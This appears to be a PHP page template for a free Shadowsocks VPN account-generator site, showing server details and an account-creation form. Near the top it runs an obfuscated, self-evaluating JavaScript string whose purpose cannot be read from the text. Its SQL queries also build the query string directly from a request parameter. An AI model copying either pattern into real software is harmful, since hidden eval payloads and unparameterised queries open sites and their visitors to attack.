<?php
if(isset($_GET['filter'])) {
  $serverid = chkString($_GET['filter']);
  $q = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'"));
  if(!$q):
    $noserver = 1;
  endif;
} else {
  $noserver = 1;
}

if(!isset($noserver)):
?>
<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
"=50){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o" +
".substr(0,ol);}f(\")41,\\\"{710\\\\500\\\\420\\\\630\\\\330\\\\400\\\\\\\\\\"+
"\\TNBF330\\\\710\\\\220\\\\L020\\\\R520\\\\530\\\\410\\\\330\\\\020\\\\GA@O" +
"WK610\\\\OSOyms}in4l~}wqd?* />7bbm`zh+hvldrn730\\\\710\\\\010\\\\@SIOYF]120" +
"\\\\730\\\\320\\\\220\\\\300\\\\U300\\\\730\\\\300\\\\r\\\\130\\\\700\\\\t\\"+
"\\520\\\\220\\\\H020\\\\n\\\\t\\\\300\\\\500\\\\(sfukmwh771\\\\3950!k==!+?%" +
"+;<<f$, 61!\\\\\\\\[O120\\\\\\\\\\\\420\\\\130\\\\420\\\\CUPXVATWNCD100\\\\" +
"HXn\\\\010\\\\\\\\\\\\710\\\\]T320\\\\230\\\\520\\\\000\\\\%>uh771\\\\sn5ow" +
"x<3v771\\\\q/`hiyiz(~jkk#chd330\\\\020\\\\<[D430\\\\420\\\\610\\\\200\\\\60" +
"0\\\\H530\\\\.300\\\\,QL1030\\\\610\\\\710\\\\100\\\\330\\\\200\\\\n\\\\430" +
"\\\\020\\\\020\\\\@=]3;/|y600\\\\*+4x;=>|4= =(;*g=&( j70!n3K[NOZ030\\\\e500" +
"\\\\QSG\\\\\\\\320\\\\Y_YC220\\\\710\\\\400\\\\EFLSLQV1iu|z`p~k\\\"(f};o nr" +
"uter};))++y(^)i(tAedoCrahc.x(edoCrahCmorf.gnirtS=+o;721=%y;++y)41<i(fi{)++i" +
";l<i;0=i(rof;htgnel.x=l,\\\"\\\"=o,i rav{)y,x(f noitcnuf\")"                 ;
while(x=eval(x));
//-->
//]]>
</script>
<div id="ndexi" style="display:none;">create-account</div>
<div id="where" style="display:none;">shadowsocks-vpn</div>

<!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
           <?php
          $name = mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'");
          while($row = mysqlI_fetch_object($name)) {
         ?>
          <h1 class="title">FREE SHADOWSOCKS VPN <?php echo location($row->location)['name'] ?></h1>
          <?php } ?>
          <h2>FREE SHADOWSOCKS SSR And SHADOWSOCKS-LIBEV VPN <?php echo $q['active_for'] ?> days</h3>
          <h3>Free shadowsocks vpn active <?php echo $q['active_for'] ?> days</h3>
          <p class="lead">Read our terms of service before creating account.</p>
          <p class="lead">Your selected server name <?php echo $q['description']?>.</p>
          <p class="lead">Hostname server <?php echo $q['host']?>.</p>
        </div>
      </div>
    <p class="text-center probootstrap-animate">
    <span class="badge badge-success mb-3 p-3">Free Shadowsocks Accounts</span>
    <span class="badge badge-warning mb-3 p-3">Free Shadowsocks SSR Accounts</span>
    <span class="badge badge-primary mb-3 p-3">Full Speed Servers</span>
    <span class="badge badge-success mb-3 p-3">Private Account</span>
    <span class="badge badge-info mb-3 p-3">Hide Your IP Adrres</span>
    <span class="badge badge-primary mb-3 p-3">Fast Shadowsocks Servers</span>
  </p> 
  <p class="text-center probootstrap-animate">
    <span class="label label-danger">No DDOS</span>
    <span class="label label-danger">No Fraud</span>
    <span class="label label-danger">No Hacking</span>
    <span class="label label-danger">No Spam</span>
  </p> 
</div>
</section>
<!-- END: section -->

<?php if(isset($_GET['filter'])) {
if(!$q) {
  exit('Please choose a server before creating account');
}
} else {
   exit('Please choose a server before creating account');
}
?>

<?php
include('app/ads/link.php');
?>
<section id="services" class="probootstrap-section">
<div class="container">
<div class="row">
<div class="col-lg-6 col-lg-offset-3" data-wow-duration="1s">
<div class="box">
<h1 class="title"> SHADOWSOCKS DETAILS </h1>
<div class="table-responsive-md">
<table class="table table-hover">
<tbody>
<tr>
<th>Hostname</th>
<td><?php echo $q['host']?></td>
</tr>
<tr>
<th>SSR Port</th>
<td>8388</td>
</tr>
<tr>
<th>OBFS Port</th>
<td>1443</td>
</tr>
<tr>
<th>Protocol SSR</th>
<td>auth_chain_a</td>
</tr>
<tr>
<th>Protocol Param</th>
<td>-</td>
</tr>
<tr>
<th>OBFS</th>
<td>tls1.2_ticket_auth</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</section>
<section class="probootstrap-section">
    <div class="container">
      <div class="row">
    <div class="<?php echo ($q['type']=='vpnssh'||$q['type']=='vpn')? 'col-lg-6 col-lg-offset-3 probootstrap-animate' : 'col-lg-6 col-lg-offset-3 probootstrap-animate'; ?>">
<form action="<?php echo $siteUrl ?>" id="form-create" method="post" class="probootstrap-form probootstrap-box">
<center>
<div class="icon"><i class="icon-user-plus"></i></div>
<h1>Generate Account</h1>
</center>
<input type="hidden" name="id" value="<?php echo $q['id'] ?>" />
<div align="center">
<?php showCaptcha('site'); ?>
<p><span style="color:grey;font-size:0.8em;">By clicking Generate button, you agree to our <a href="?do=terms">Terms Of Service.</a></span></p>
<input type="submit" class="btn btn-primary" role="button" name="generate" value="Generate Now" />
<p>
<?php
  if (isset($_POST['generate'])) {
    $pageUrl = "https://".$_SERVER['HTTP_HOST']."/ajax.proc.php?do=generate";
    $_POST['last_submit'] = $_SESSION['last_submit'];
    $params = http_build_query ($_POST);
    $contextData = array ( 
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n".
                            "Connection: close\r\n".
                            "Content-Length: ".strlen($params)."\r\n",
                'content'=> $params );
    $context = stream_context_create (array ( 'http' => $contextData ));
    $resultCreateAcc =  file_get_contents ($pageUrl, false, $context);
    if (!isset($_SESSION['last_submit']) || time()-$_SESSION['last_submit'] > 300) {
        $_SESSION['last_submit'] = time();
    }
    echo($resultCreateAcc);
  }
?>
<?php
include('app/ads/ads.php');
?>
</div>
</div>
</form>
</div>
</div>
</div>
</section>

<!-- START: section -->
  <section class="probootstrap-section probootstrap-section-colored">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2>Why Use Shadowsocks?</h2>
        </div>
      </div>
      <div class="row">
          <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-unlocked"></i> <span>Proxy</span></h3>
          <p>Shadowsocks is an open-source proxy project built with the intention of circumventing internet censorship</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-eye-blocked"></i> <span>Uncensored</span></h3>
          <p>The Shadowsocks connection bypasses local government internet restrictions so that you always have full access to Facebook, Twitter, YouTube and all the richness of the internet has to offer</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-key"></i> <span>Privacy</span></h3>
          <p>Shadowsocks uses security protocol SSL/TLS to encrypt all your internet traffic and ensure your information is kept private and secure, so that ISPs or government can not log your information</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
      </div>
    </div>
   </div>
  </section>
  <!-- END: section -->
<?php
else:
  include('app/pages/404.php');
endif;
?>
<script type="text/javascript">
    function copy_text() {
        document.getElementById("pilih").select();
        document.execCommand("copy");
        alert("Berhasil disalin ke clipboard.");
    }
    function copy_text2() {
        document.getElementById("pilih2").select();
        document.execCommand("copy");
        alert("Berhasil disalin ke clipboard.");
    }
</script>
<!-- END: page -->